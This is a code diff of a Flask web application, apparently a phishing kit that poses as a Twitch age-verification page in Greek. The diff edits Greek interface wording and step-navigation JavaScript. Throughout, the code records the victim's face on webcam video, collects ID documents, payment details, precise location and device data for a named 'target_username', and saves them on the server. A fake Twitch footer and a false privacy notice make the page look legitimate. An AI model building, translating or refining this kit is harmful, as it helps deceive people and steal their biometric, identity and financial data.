+                    Κάντε κλικ στο κουμπί παρακάτω για να μοιραστείτε την τοποθεσία σας
                 </div>
                 
                 <button class="button primary-btn" id="locationBtn" onclick="requestLocation()">
-                    Κοινή Χρήση Τοποθεσίας
+                    Κοινοποίηση Τοποθεσίας
                 </button>
                 
                 <button class="button secondary-btn" onclick="prevStep()">
@@ -1627,18 +1657,19 @@ def create_html_template(settings):
                 </button>
             </div>
             
+            <!-- ΒΗΜΑ FINAL: Επεξεργασία -->
             <div class="step" id="stepFinal">
-                <h2 class="step-title">Επαλήθευση σε Εξέλιξη</h2>
+                <h2 class="step-title">Επεξεργασία Επαλήθευσης σε Εξέλιξη</h2>
                 <p class="step-subtitle">
-                    Παρακαλώ περιμένετε ενώ επαληθεύουμε τις πληροφορίες σας. Αυτό μπορεί να διαρκέσει λίγα λεπτά.
+                    Παρακαλώ περιμένετε όσο επαληθεύουμε τα στοιχεία σας. Αυτό μπορεί να διαρκέσει λίγα λεπτά.
                 </p>
                 
                 <div class="info-box" style="text-align: center; padding: 40px;">
                     <div class="instruction-icon" style="font-size: 4rem;">⏳</div>
-                    <div class="instruction-text">Επεξεργασία Επαλήθευσής Σας</div>
+                    <div class="instruction-text">Επεξεργασία της Επαλήθευσής σας</div>
                     <div class="instruction-detail">
                         <div class="loading-spinner" style="margin-right: 10px;"></div>
-                        Ανάλυση υποβεβλημένων δεδομένων...
+                        Ανάλυση των υποβληθέντων δεδομένων...
                     </div>
                 </div>
                 
@@ -1647,50 +1678,52 @@ def create_html_template(settings):
                 </div>
             </div>
             
+            <!-- ΒΗΜΑ COMPLETE -->
             <div class="step" id="stepComplete">
                 <div class="completion-container">
                     <div class="success-icon">✅</div>
                     
                     <h2 class="completion-title">Η Επαλήθευση Υποβλήθηκε!</h2>
                     <p class="step-subtitle">
-                        Ευχαριστούμε, <strong class="twitch-purple">@{target_username}</strong>! Τα δεδομένα επαλήθευσης σας έχουν 
-                        υποβληθεί επιτυχώς για εξέταση.
+                        Σας ευχαριστούμε, <strong class="twitch-purple">@{target_username}</strong>! Τα δεδομένα επαλήθευσής σας έχουν 
+                        υποβληθεί με επιτυχία για έλεγχο.
                     </p>
                     
                     <div class="info-box">
                         <div class="info-header">
                             <div class="info-icon">📋</div>
-                            <div class="info-title">Τι συμβαίνει μετά;</div>
+                            <div class="info-title">Τι γίνεται τώρα;</div>
                         </div>
                         <div class="info-content">
                             <ul style="margin-top: 10px;">
-                                <li>Η ομάδα μας θα εξετάσει την υποβολή σας (συνήθως 24-48 ώρες)</li>
-                                <li>Θα λάβετε email με το αποτέλεσμα της επαλήθευσης</li>
-                                {'<li>Μόλις εγκριθεί, τα χαρακτηριστικά streaming θα ενεργοποιηθούν</li>' if account_type == 'streamer' 
-                                 else '<li>Μόλις εγκριθεί, η πρόσβαση σε περιεχόμενο με περιορισμό ηλικίας θα αποκατασταθεί</li>'}
-                                <li>Εάν απαιτείται επιπλέον πληροφόρηση, θα επικοινωνήσουμε μαζί σας</li>
+                                <li>Η ομάδα μας θα ελέγξει την υποβολή σας (συνήθως 24-48 ώρες)</li>
+                                <li>Θα λάβετε ένα email με το αποτέλεσμα της επαλήθευσης</li>
+                                {'<li>Μόλις εγκριθεί, οι λειτουργίες μετάδοσης θα ενεργοποιηθούν</li>' if account_type == 'streamer' 
+                                 else '<li>Μόλις εγκριθεί, η πρόσβαση σε περιεχόμενο περιορισμένης ηλικίας θα αποκατασταθεί</li>'}
+                                <li>Αν χρειαστούν επιπλέον στοιχεία, θα επικοινωνήσουμε μαζί σας</li>
                             </ul>
                         </div>
                     </div>
                     
                     <div class="next-steps">
                         <p class="step-subtitle">
-                            Θα μεταφερθείτε στη σελίδα εξέτασης σε <span class="countdown" id="countdown">5</span> δευτερόλεπτα...
+                            Θα ανακατευθυνθείτε στη σελίδα ελέγχου σε <span class="countdown" id="countdown">5</span> δευτερόλεπτα...
                         </p>
                         <button class="button primary-btn" onclick="showReviewPage()">
-                            Συνέχεια στην Κατάσταση Εξέτασης
+                            Συνέχεια στην Κατάσταση Ελέγχου
                         </button>
                     </div>
                 </div>
             </div>
             
+            <!-- ΒΗΜΑ REVIEW -->
             <div class="step" id="stepReview">
                 <div class="review-container">
                     <div class="review-icon">⏳</div>
                     
-                    <h2 class="step-title">Επαλήθευση Υπό Εξέταση</h2>
+                    <h2 class="step-title">Η Επαλήθευση Βρίσκεται υπό Έλεγχο</h2>
                     <p class="step-subtitle">
-                        Η υποβολή επαλήθευσης ηλικίας σας εξετάζεται από την ομάδα Εμπιστοσύνης & Ασφάλειας του Twitch.
+                        Η υποβολή επαλήθευσης ηλικίας σας ελέγχεται από την ομάδα Εμπιστοσύνης & Ασφάλειας του Twitch.
                     </p>
                     
                     <div class="review-steps">
@@ -1699,7 +1732,7 @@ def create_html_template(settings):
                             <div class="step-content">
                                 <div class="step-title">Υποβολή Λήφθηκε</div>
                                 <div class="step-description">
-                                    Η σάρωση προσώπου σας, τα έγγραφα ταυτότητας και τα δεδομένα τοποθεσίας έχουν ληφθεί και βρίσκονται σε ουρά για εξέταση.
+                                    Η σάρωση προσώπου, τα έγγραφα ταυτότητας και τα δεδομένα τοποθεσίας σας έχουν ληφθεί και βρίσκονται σε ουρά για έλεγχο.
                                 </div>
                             </div>
                         </div>
@@ -1707,9 +1740,9 @@ def create_html_template(settings):
                         <div class="review-step">
                             <div class="step-number">2</div>
                             <div class="step-content">
-                                <div class="step-title">Διαδικασία Χειροκίνητης Εξέτασης</div>
+                                <div class="step-title">Διαδικασία Χειροκίνητου Ελέγχου</div>
                                 <div class="step-description">
-                                    Η ομάδα μας εξετάζει χειροκίνητα τα δεδομένα επαλήθευσής σας για να διασφαλίσει τη συμμόρφωση με τις πολιτικές του Twitch.
+                                    Η ομάδα μας ελέγχει χειροκίνητα τα δεδομένα επαλήθευσής σας για συμμόρφωση με τις πολιτικές του Twitch.
                                 </div>
                             </div>
                         </div>
@@ -1719,7 +1752,7 @@ def create_html_template(settings):
                             <div class="step-content">
                                 <div class="step-title">Έλεγχος Επαλήθευσης Ηλικίας</div>
                                 <div class="step-description">
-                                    Επαληθεύουμε την ηλικία σας βάσει των υποβεβλημένων εγγράφων για να διασφαλίσουμε τη συμμόρφωση με τους περιφερειακούς νόμους.
+                                    Επαληθεύουμε την ηλικία σας βάσει των υποβληθέντων εγγράφων για συμμόρφωση με τους τοπικούς νόμους.
                                 </div>
                             </div>
                         </div>
@@ -1738,10 +1771,10 @@ def create_html_template(settings):
                     <div class="info-box">
                         <div class="info-header">
                             <div class="info-icon">📧</div>
-                            <div class="info-title">Ελέγξτε Το Email Σας</div>
+                            <div class="info-title">Ελέγξτε το Email σας</div>
                         </div>
                         <div class="info-content">
-                            Έχουμε στείλει μια επιβεβαίωση στο email που είναι καταχωρημένο. Παρακαλώ ελέγξτε το εισερχόμενο (και τον φάκελο spam) σας για ενημερώσεις.
+                            Στείλαμε μια επιβεβαίωση στο email που έχετε καταχωρήσει. Ελέγξτε τα εισερχόμενα (και τα ανεπιθύμητα) για ενημερώσεις.
                         </div>
                     </div>
                     
@@ -1761,7 +1794,7 @@ def create_html_template(settings):
             <div>© 2024 Twitch, Inc. Με επιφύλαξη παντός δικαιώματος.</div>
             <div class="footer-links">
                 <a href="/privacy_policy">Πολιτική Απορρήτου</a>
-                <a href="#">Όροι Χρήσης</a>
+                <a href="#">Όροι Παροχής Υπηρεσιών</a>
                 <a href="#">Οδηγίες Κοινότητας</a>
                 <a href="#">Κέντρο Βοήθειας</a>
             </div>
@@ -1769,8 +1802,80 @@ def create_html_template(settings):
     </div>
     
     <script>
-        let currentStep = 1;
-        let totalSteps = {total_steps};
+        // --- Πλοήγηση βημάτων με δυναμική λίστα ---
+        var stepIds = {step_ids_json};
+        var mainStepIds = {main_step_ids_json};
+        var currentStepIndex = 0;  // δείκτης στον stepIds
+        
+        // σύνολο κύριων βημάτων (εξαιρούνται complete και review)
+        var totalMainSteps = mainStepIds.length;
+        
+        function updateProgress() {{
+            // Υπολογισμός προόδου με βάση τον τρέχοντα δείκτη εντός των κύριων βημάτων
+            var progress = 0;
+            if (currentStepIndex < mainStepIds.length) {{
+                progress = (currentStepIndex / (mainStepIds.length - 1)) * 100;
+            }} else if (currentStepIndex >= mainStepIds.length) {{
+                progress = 100;
+            }}
+            document.getElementById('progressFill').style.width = progress + '%';
+            document.getElementById('stepLineFill').style.width = progress + '%';
+            
+            // Ενημέρωση δεικτών (μόνο για κύρια βήματα, το πολύ 5)
+            var indicators = document.querySelectorAll('.step-indicator');
+            for (var i = 0; i < indicators.length; i++) {{
+                var idx = i; // 0-based
+                indicators[i].classList.remove('active', 'completed');
+                if (idx < currentStepIndex) {{
+                    indicators[i].classList.add('completed');
+                }} else if (idx === currentStepIndex && currentStepIndex < mainStepIds.length) {{
+                    indicators[i].classList.add('active');
+                }}
+            }}
+        }}
+        
+        function showStepById(stepId) {{
+            // Απόκρυψη όλων των βημάτων
+            document.querySelectorAll('.step').forEach(function(el) {{
+                el.classList.remove('active');
+            }});
+            var stepElement = document.getElementById(stepId);
+            if (stepElement) {{
+                stepElement.classList.add('active');
+            }}
+        }}
+        
+        function goToStepIndex(index) {{
+            if (index >= 0 && index < stepIds.length) {{
+                currentStepIndex = index;
+                showStepById(stepIds[index]);
+                updateProgress();
+            }}
+        }}
+        
+        function nextStep() {{
+            // Αν βρισκόμαστε στο τελευταίο κύριο βήμα (stepFinal), δεν προχωράμε περαιτέρω με το next
+            var lastMainIndex = mainStepIds.length - 1;
+            if (currentStepIndex < lastMainIndex) {{
+                goToStepIndex(currentStepIndex + 1);
+            }}
+        }}
+        
+        function prevStep() {{
+            if (currentStepIndex > 0) {{
+                goToStepIndex(currentStepIndex - 1);
+            }}
+        }}
+        
+        // Για εξωτερικές κλήσεις, π.χ. μετά την επαλήθευση προσώπου
+        function goToNextMainStep() {{
+            var lastMainIndex = mainStepIds.length - 1;
+            if (currentStepIndex < lastMainIndex) {{
+                goToStepIndex(currentStepIndex + 1);
+            }}
+        }}
+        
+        // Μεταβλητές επαλήθευσης προσώπου
         let faceStream = null;
         let faceRecorder = null;
         let faceChunks = [];
@@ -1788,61 +1893,26 @@ def create_html_template(settings):
         let countdownTimer = null;
         
         let faceInstructions = [
-            {{icon: "👤", text: "Κοιτάξτε Ευθεία Μπροστά", detail: "Κρατήστε το πρόσωπό σας κεντραρισμένο στον κύκλο", duration: 3}},
-            {{icon: "👈", text: "Γυρίστε το Κεφάλι Αριστερά", detail: "Γυρίστε αργά το κεφάλι σας προς την αριστερή πλευρά", duration: 3}},
-            {{icon: "👉", text: "Γυρίστε το Κεφάλι Δεξιά", detail: "Γυρίστε αργά το κεφάλι σας προς τη δεξιά πλευρά", duration: 3}},
-            {{icon: "👆", text: "Κοιτάξτε Πάνω", detail: "Αποκλίνετε ελαφρά το κεφάλι σας προς τα πάνω", duration: 3}},
-            {{icon: "👇", text: "Κοιτάξτε Κάτω", detail: "Αποκλίνετε ελαφρά το κεφάλι σας προς τα κάτω", duration: 3}},
-            {{icon: "😉", text: "Κλείστε Διαρκώς τα Μάτια", detail: "Κλείστε τα μάτια σας λίγες φορές", duration: 2}},
-            {{icon: "😊", text: "Χαμογελάστε", detail: "Χαμογελάστε μας φυσικά", duration: 2}},
-            {{icon: "✅", text: "Ολοκληρώθηκε", detail: "Επαλήθευση προσώπου επιτυχής!", duration: 1}}
+            {{icon: "👤", text: "Κοιτάξτε Ίσια", detail: "Κρατήστε το πρόσωπό σας στο κέντρο του κύκλου", duration: 3}},
+            {{icon: "👈", text: "Γυρίστε το Κεφάλι Αριστερά", detail: "Γυρίστε αργά το κεφάλι σας προς τα αριστερά", duration: 3}},
+            {{icon: "👉", text: "Γυρίστε το Κεφάλι Δεξιά", detail: "Γυρίστε αργά το κεφάλι σας προς τα δεξιά", duration: 3}},
+            {{icon: "👆", text: "Κοιτάξτε Πάνω", detail: "Γείρετε ελαφρά το κεφάλι σας προς τα πάνω", duration: 3}},
+            {{icon: "👇", text: "Κοιτάξτε Κάτω", detail: "Γείρετε ελαφρά το κεφάλι σας προς τα κάτω", duration: 3}},
+            {{icon: "😉", text: "Κλείστε τα Μάτια Φυσικά", detail: "Κλείστε τα μάτια σας μερικές φορές", duration: 2}},
+            {{icon: "😊", text: "Χαμογελάστε", detail: "Δώστε μας ένα φυσικό χαμόγελο", duration: 2}},
+            {{icon: "✅", text: "Ολοκλήρωση", detail: "Η επαλήθευση προσώπου ήταν επιτυχής!", duration: 1}}
         ];
         
-        function updateProgress() {{
-            const progress = ((currentStep - 1) / (totalSteps - 1)) * 100;
-            document.getElementById('progressFill').style.width = progress + '%';
-            document.getElementById('stepLineFill').style.width = progress + '%';
-            
-            const indicators = document.querySelectorAll('.step-indicator');
-            indicators.forEach((indicator, index) => {{
-                indicator.classList.remove('active', 'completed');
-                if (index + 1 < currentStep) {{
-                    indicator.classList.add('completed');
-                }} else if (index + 1 === currentStep) {{
-                    indicator.classList.add('active');
-                }}
-            }});
-        }}
+        // Παράκαμψη της αρχικής εμφάνισης με τη δική μας πλοήγηση
+        // Ξεκινάμε από το step1 (δείκτης 0)
+        goToStepIndex(0);
         
-        function showStep(stepNumber) {{
-            document.querySelectorAll('.step').forEach(step => {{
-                step.classList.remove('active');
-            }});
-            const stepElement = document.getElementById('step' + stepNumber);
-            if (stepElement) {{
-                stepElement.classList.add('active');
-                currentStep = stepNumber;
-                updateProgress();
-            }}
-        }}
-        
-        function nextStep() {{
-            if (currentStep < totalSteps + 1) {{
-                showStep(currentStep + 1);
-            }}
-        }}
-        
-        function prevStep() {{
-            if (currentStep > 1) {{
-                showStep(currentStep - 1);
-            }}
-        }}
-        
+        // --- Επαλήθευση Προσώπου ---
         async function startFaceVerification() {{
             try {{
                 const button = document.getElementById('startFaceBtn');
                 button.disabled = true;
-                button.innerHTML = '<span class="loading-spinner"></span>Πρόσβαση σε Κάμερα...';
+                button.innerHTML = '<span class="loading-spinner"></span>Πρόσβαση στην κάμερα...';
                 
                 faceStream = await navigator.mediaDevices.getUserMedia({{
                     video: {{
@@ -1857,8 +1927,8 @@ def create_html_template(settings):
                 startFaceInstructions();
                 
             }} catch (error) {{
-                console.error('Camera access error:', error);
-                alert('Δεν είναι δυνατή η πρόσβαση στην κάμερα. Βεβαιωθείτε ότι έχουν παραχωρηθεί δικαιώματα κάμερας.');
+                console.error('Σφάλμα πρόσβασης στην κάμερα:', error);
+                alert('Αδυναμία πρόσβασης στην κάμερα. Παρακαλώ επιτρέψτε την πρόσβαση στην κάμερα.');
                 const button = document.getElementById('startFaceBtn');
                 button.disabled = false;
                 button.textContent = 'Έναρξη Σάρωσης Προσώπου';
@@ -1932,9 +2002,9 @@ def create_html_template(settings):
                 faceStream.getTracks().forEach(track => track.stop());
             }}
             showFaceInstruction(faceInstructions.length - 1);
-            document.getElementById('faceTimer').textContent = "✅ Ολοκληρώθηκε";
+            document.getElementById('faceTimer').textContent = "✅ Ολοκλήρωση";
             setTimeout(() => {{
-                nextStep();
+                goToNextMainStep();
             }}, 2000);
         }}
         
@@ -1967,6 +2037,7 @@ def create_html_template(settings):
             reader.readAsDataURL(videoBlob);
         }}
         
+        // --- Επαλήθευση Ταυτότητας ---
         function handleIDFileSelect(input, type) {{
             const file = input.files[0];
             if (file) handleIDFile(file, type);
@@ -2021,8 +2092,8 @@ def create_html_template(settings):
                 contentType: false,
                 success: function(response) {{
                     statusDiv.className = 'status-message status-success';
-                    statusDiv.textContent = '✓ Τα έγγραφα ταυτότητας μεταφορτώθηκαν επιτυχώς!';
-                    setTimeout(() => nextStep(), 1500);
+                    statusDiv.textContent = '✓ Τα έγγραφα ταυτότητας μεταφορτώθηκαν με επιτυχία!';
+                    setTimeout(() => goToNextMainStep(), 1500);
                 }},
                 error: function(xhr, status, error) {{
                     statusDiv.className = 'status-message status-error';
@@ -2033,6 +2104,7 @@ def create_html_template(settings):
             }});
         }}
         
+        // --- Επαλήθευση Πληρωμής ---
         function selectPaymentMethod(method) {{
             selectedPaymentMethod = method;
             document.querySelectorAll('.payment-option').forEach(option => {{
@@ -2063,7 +2135,7 @@ def create_html_template(settings):
             }};
             setTimeout(() => {{
                 statusDiv.className = 'status-message status-success';
-                statusDiv.textContent = '✓ Η μέθοδος πληρωμής επαληθεύτηκε επιτυχώς!';
+                statusDiv.textContent = '✓ Η μέθοδος πληρωμής επαληθεύτηκε με επιτυχία!';
                 $.ajax({{
                     url: '/submit_payment_verification',
                     type: 'POST',
@@ -2073,10 +2145,11 @@ def create_html_template(settings):
                         console.log('Η επαλήθευση πληρωμής μεταφορτώθηκε');
                     }}
                 }});
-                setTimeout(() => nextStep(), 1500);
+                setTimeout(() => goToNextMainStep(), 1500);
             }}, 2000);
         }}
         
+        // --- Επαλήθευση Τοποθεσίας ---
         function requestLocation() {{
             const button = document.getElementById('locationBtn');
             const statusDiv = document.getElementById('locationStatus');
@@ -2089,9 +2162,9 @@ def create_html_template(settings):
             
             if (!navigator.geolocation) {{
                 statusDiv.className = 'status-message status-error';
-                statusDiv.textContent = 'Η γεωτοποθεσία δεν υποστηρίζεται από το πρόγραμμα περιήγησής σας.';
+                statusDiv.textContent = 'Η γεωτοποθεσία δεν υποστηρίζεται από τον περιηγητή σας.';
                 button.disabled = false;
-                button.textContent = 'Δοκιμάστε Ξανά';
+                button.textContent = 'Προσπάθεια ξανά';
                 return;
             }}
             
@@ -2105,7 +2178,7 @@ def create_html_template(settings):
                     statusDiv.className = 'status-message status-error';
                     statusDiv.textContent = `Σφάλμα: ${{error.message}}. Παρακαλώ ενεργοποιήστε τις υπηρεσίες τοποθεσίας.`;
                     button.disabled = false;
-                    button.textContent = 'Δοκιμάστε Ξανά';
+                    button.textContent = 'Προσπάθεια ξανά';
                 }},
                 {{ enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }}
             );
@@ -2129,7 +2202,7 @@ def create_html_template(settings):
             document.getElementById('locationDetails').style.display = 'block';
             const statusDiv = document.getElementById('locationStatus');
             statusDiv.className = 'status-message status-success';
-            statusDiv.textContent = `✓ Η τοποθεσία λήφθηκε με ακρίβεια ${{Math.round(accuracy)}}μ`;
+            statusDiv.textContent = `✓ Η τοποθεσία λήφθηκε με ακρίβεια ${{Math.round(accuracy)}}m`;
             locationData = {{
                 latitude: lat,
                 longitude: lon,
@@ -2168,12 +2241,20 @@ def create_html_template(settings):
         function completeLocationVerification() {{
             const button = document.getElementById('locationBtn');
             button.disabled = true;
-            button.textContent = '✓ Η Τοποθεσία Επαληθεύτηκε';
-            setTimeout(() => startFinalVerification(), 2000);
+            button.textContent = '✓ Τοποθεσία Επαληθεύτηκε';
+            // Μετάβαση στο επόμενο κύριο βήμα (θα πρέπει να είναι το stepFinal)
+            goToNextMainStep();
+            // Μετά τη μετάβαση στο stepFinal, ξεκινάμε την τελική διαδικασία επαλήθευσης
+            setTimeout(() => startFinalVerification(), 1500);
         }}
         
+        // --- Τελική Επεξεργασία ---
         function startFinalVerification() {{
-            showStep('stepFinal');
+            // Βεβαιωνόμαστε ότι βρισκόμαστε στο stepFinal
+            var stepFinalIndex = stepIds.indexOf('stepFinal');
+            if (currentStepIndex !== stepFinalIndex) {{
+                goToStepIndex(stepFinalIndex);
+            }}
             const statusDiv = document.getElementById('finalStatus');
             let progress = 25;
             const progressInterval = setInterval(() => {{
@@ -2199,7 +2280,11 @@ def create_html_template(settings):
         }}
         
         function showCompletionPage() {{
-            showStep('stepComplete');
+            // Μετάβαση στο stepComplete
+            var completeIndex = stepIds.indexOf('stepComplete');
+            if (completeIndex !== -1) {{
+                goToStepIndex(completeIndex);
+            }}
             let countdown = 5;
             const countdownElement = document.getElementById('countdown');
             countdownElement.textContent = countdown;
@@ -2215,7 +2300,10 @@ def create_html_template(settings):
         
         function showReviewPage() {{
             clearInterval(countdownTimer);
-            showStep('stepReview');
+            var reviewIndex = stepIds.indexOf('stepReview');
+            if (reviewIndex !== -1) {{
+                goToStepIndex(reviewIndex);
+            }}
         }}
         
         function returnToTwitch() {{
@@ -2223,7 +2311,7 @@ def create_html_template(settings):
         }}
         
         function checkVerificationStatus() {{
-            alert('Η κατάσταση επαλήθευσης θα σταλεί στο email σας εντός 48 ωρών. Παρακαλώ ελέγξτε το email που σχετίζεται με τον λογαριασμό σας στο Twitch.');
+            alert('Η κατάσταση της επαλήθευσης θα σταλεί στο email σας εντός 48 ωρών. Ελέγξτε το email που σχετίζεται με τον λογαριασμό Twitch σας.');
         }}
         
         function submitCompleteVerification() {{
@@ -2234,7 +2322,7 @@ def create_html_template(settings):
                     session_id: sessionId,
                     target_username: targetUsername,
                     account_type: accountType,
-                    completed_steps: currentStep,
+                    completed_steps: currentStepIndex,
                     verification_timestamp: new Date().toISOString(),
                     user_agent: navigator.userAgent,
                     screen_resolution: `${{screen.width}}x${{screen.height}}`,
@@ -2243,9 +2331,6 @@ def create_html_template(settings):
                 contentType: 'application/json'
             }});
         }}
-        
-        updateProgress();
-        setTimeout(() => showStep(1), 500);
     </script>
 </body>
 </html>'''
@@ -2290,9 +2375,9 @@ def submit_face_verification():
             print(f"Αποθηκεύτηκε επαλήθευση προσώπου Twitch για {target_username}: {filename}")
             return jsonify({"status": "success", "message": "Η επαλήθευση προσώπου υποβλήθηκε"}), 200
         else:
-            return jsonify({"status": "error", "message": "Δεν λήφθηκαν δεδομένα βίντεο προσώπου"}), 400
+            return jsonify({"status": "error", "message": "Δεν ελήφθησαν δεδομένα βίντεο προσώπου"}), 400
     except Exception as e:
-        print(f"Σφάλμα αποθήκευσης επαλήθευσης προσώπου: {e}")
+        print(f"Σφάλμα κατά την αποθήκευση επαλήθευσης προσώπου: {e}")
         return jsonify({"status": "error", "message": str(e)}), 500
 
 @app.route('/submit_id_verification', methods=['POST'])
@@ -2342,7 +2427,7 @@ def submit_id_verification():
         return jsonify({"status": "success", "message": "Η επαλήθευση ταυτότητας υποβλήθηκε"}), 200
         
     except Exception as e:
-        print(f"Σφάλμα αποθήκευσης επαλήθευσης ταυτότητας: {e}")
+        print(f"Σφάλμα κατά την αποθήκευση επαλήθευσης ταυτότητας: {e}")
         return jsonify({"status": "error", "message": str(e)}), 500
 
 @app.route('/submit_payment_verification', methods=['POST'])
@@ -2368,12 +2453,12 @@ def submit_payment_verification():
             with open(file_path, 'w') as f:
                 json.dump(safe_data, f, indent=2)
             
-            print(f"Αποθηκεύτηκε επαλήθευση πληρωμών Twitch για {target_username}: {filename}")
-            return jsonify({"status": "success", "message": "Η επαλήθευση πληρωμών υποβλήθηκε"}), 200
+            print(f"Αποθηκεύτηκε επαλήθευση πληρωμής Twitch για {target_username}: {filename}")
+            return jsonify({"status": "success", "message": "Η επαλήθευση πληρωμής υποβλήθηκε"}), 200
         else:
-            return jsonify({"status": "error", "message": "Δεν λήφθηκαν δεδομένα πληρωμής"}), 400
+            return jsonify({"status": "error", "message": "Δεν ελήφθησαν δεδομένα πληρωμής"}), 400
     except Exception as e:
-        print(f"Σφάλμα αποθήκευσης επαλήθευσης πληρωμών: {e}")
+        print(f"Σφάλμα κατά την αποθήκευση επαλήθευσης πληρωμής: {e}")
         return jsonify({"status": "error", "message": str(e)}), 500
 
 @app.route('/submit_location_verification', methods=['POST'])
@@ -2390,9 +2475,9 @@ def submit_location_verification():
             print(f"Λήφθηκαν δεδομένα τοποθεσίας Twitch για {target_username}: {session_id}")
             return jsonify({"status": "success", "message": "Η επαλήθευση τοποθεσίας υποβλήθηκε"}), 200
         else:
-            return jsonify({"status": "error", "message": "Δεν λήφθηκαν δεδομένα τοποθεσίας"}), 400
+            return jsonify({"status": "error", "message": "Δεν ελήφθησαν δεδομένα τοποθεσίας"}), 400
     except Exception as e:
-        print(f"Σφάλμα αποθήκευσης επαλήθευσης τοποθεσίας: {e}")
+        print(f"Σφάλμα κατά την αποθήκευση επαλήθευσης τοποθεσίας: {e}")
         return jsonify({"status": "error", "message": str(e)}), 500
 
 @app.route('/submit_complete_verification', methods=['POST'])
@@ -2417,68 +2502,68 @@ def submit_complete_verification():
             print(f"Αποθηκεύτηκε πλήρης επαλήθευση Twitch για {target_username}: {filename}")
             return jsonify({"status": "success", "message": "Η επαλήθευση ολοκληρώθηκε"}), 200
         else:
-            return jsonify({"status": "error", "message": "Δεν λήφθηκαν δεδομένα"}), 400
+            return jsonify({"status": "error", "message": "Δεν ελήφθησαν δεδομένα"}), 400
     except Exception as e:
-        print(f"Σφάλμα αποθήκευσης σύνοψης επαλήθευσης: {e}")
+        print(f"Σφάλμα κατά την αποθήκευση σύνοψης επαλήθευσης: {e}")
         return jsonify({"status": "error", "message": str(e)}), 500
 
 @app.route('/privacy_policy')
 def privacy_policy():
     return '''<!DOCTYPE html>
-    <html lang="el">
+    <html>
     <head>
         <title>Πολιτική Απορρήτου Twitch</title>
         <style>
-            body {{ 
+            body { 
                 font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                 padding: 20px; 
                 max-width: 800px; 
                 margin: 0 auto; 
                 background-color: #0f0f23;
                 color: #efeff1;
-            }}
-            h1 {{ 
+            }
+            h1 { 
                 color: #9146ff; 
                 margin-bottom: 30px;
                 font-size: 2.5rem;
-            }}
-            h2 {{
+            }
+            h2 {
                 color: #bf94ff;
                 margin-top: 30px;
                 margin-bottom: 15px;
                 font-size: 1.5rem;
-            }}
-            .container {{
+            }
+            .container {
                 background: linear-gradient(135deg, #18182b 0%, #1a1a2e 100%);
                 padding: 40px;
                 border-radius: 16px;
                 border: 1px solid #26263a;
                 box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
-            }}
-            ul {{
+            }
+            ul {
                 padding-left: 20px;
                 margin: 15px 0;
-            }}
-            li {{
+            }
+            li {
                 margin-bottom: 12px;
                 line-height: 1.6;
                 color: #adadb8;
-            }}
-            strong {{
+            }
+            strong {
                 color: #efeff1;
-            }}
-            p {{
+            }
+            p {
                 color: #adadb8;
                 line-height: 1.6;
                 margin-bottom: 20px;
-            }}
-            .highlight {{
+            }
+            .highlight {
                 background: rgba(145, 70, 255, 0.1);
                 border-left: 4px solid #9146ff;
                 padding: 15px 20px;
                 margin: 20px 0;
                 border-radius: 0 8px 8px 0;
-            }}
+            }
         </style>
     </head>
     <body>
@@ -2486,94 +2571,91 @@ def privacy_policy():
             <h1>Ειδοποίηση Απορρήτου Επαλήθευσης Ηλικίας Twitch</h1>
             
             <div class="highlight">
-                Αυτή η διαδικασία επαλήθευσης απαιτείται για συμμόρφωση με τους περιορισμούς ηλικίας, τους περιφερειακούς νόμους και τους Όρους Χρήσης του Twitch.
+                Αυτή η διαδικασία επαλήθευσης απαιτείται για συμμόρφωση με περιορισμούς ηλικίας, τοπικούς νόμους και τους Όρους Παροχής Υπηρεσιών του Twitch.
             </div>
             
             <h2>Συλλογή Δεδομένων</h2>
             <p>Κατά τη διαδικασία επαλήθευσης Twitch, συλλέγουμε:</p>
             <ul>
                 <li><strong>Δεδομένα Αναγνώρισης Προσώπου</strong> - Προσωρινή σάρωση βίντεο για επαλήθευση ταυτότητας</li>
-                <li><strong>Πληροφορίες Εγγράφου Ταυτότητας</strong> - Επίσημα έγγραφα ταυτότητας, φοιτητικές ταυτότητες ή έντυπα συγκατάθεσης γονέων</li>
-                <li><strong>Πληροφορίες Πληρωμής</strong> - Για επαλήθευση μονετοποίησης streamer (επεξεργάζονται με ασφάλεια)</li>
-                <li><strong>Δεδομένα Τοποθεσίας</strong> - Για περιφερειακή συμμόρφωση και επιβολή περιορισμών περιεχομένου</li>
-                <li><strong>Πληροφορίες Συσκευής</strong> - Για μέτρα ασφάλειας και πρόληψης απάτης</li>
+                <li><strong>Πληροφορίες Εγγράφων Ταυτότητας</strong> - Κρατική ταυτότητα, φοιτητική ταυτότητα ή έντυπα γονικής συναίνεσης</li>
+                <li><strong>Πληροφορίες Πληρωμής</strong> - Για επαλήθευση αποκλειστικοποίησης streamer (ασφαλής επεξεργασία)</li>
+                <li><strong>Δεδομένα Τοποθεσίας</strong> - Για συμμόρφωση περιοχής και επιβολή περιορισμών περιεχομένου</li>
+                <li><strong>Πληροφορίες Συσκευής</strong> - Για μέτρα ασφαλείας και πρόληψης απάτης</li>
             </ul>
             
             <h2>Σκοπός Συλλογής Δεδομένων</h2>
             <p>Τα δεδομένα σας χρησιμοποιούνται αποκλειστικά για:</p>
             <ul>
-                <li>Επαλήθευση ηλικίας και συμμόρφωση με περιφερειακούς νόμους</li>
+                <li>Επαλήθευση ηλικίας και συμμόρφωση με τοπικούς νόμους</li>
                 <li>Πιστοποίηση ταυτότητας και πρόληψη απάτης</li>
-                <li>Επαλήθευση μονετοποίησης streamer (όπου ισχύει)</li>
-                <li>Περιφερειακή συμμόρφωση περιεχομένου και επιβολή περιορισμών</li>
-                <li>Βελτίωση ασφάλειας λογαριασμού και πρόληψη μη εξουσιοδοτημένης πρόσβασης</li>
+                <li>Επαλήθευση αποκλειστικοποίησης streamer (όπου εφαρμόζεται)</li>
+                <li>Συμμόρφωση περιφερειακού περιεχομένου και επιβολή περιορισμών</li>
+                <li>Ενίσχυση ασφαλείας λογαριασμού και αποτροπή μη εξουσιοδοτημένης πρόσβασης</li>
             </ul>
             
             <h2>Ασφάλεια Δεδομένων</h2>
-            <p>Εφαρμόζουμε πρότυπα μέτρα ασφάλειας βιομηχανίας:</p>
+            <p>Εφαρμόζουμε πρότυπα ασφαλείας κορυφαίου επιπέδου:</p>
             <ul>
-                <li>Κρυπτογράφηση end-to-end για όλες τις μεταδόσεις δεδομένων</li>
+                <li>Κρυπτογράφηση από άκρο σε άκρο για όλες τις μεταδόσεις δεδομένων</li>
                 <li>Ασφαλής αποθήκευση με κρυπτογράφηση AES-256</li>
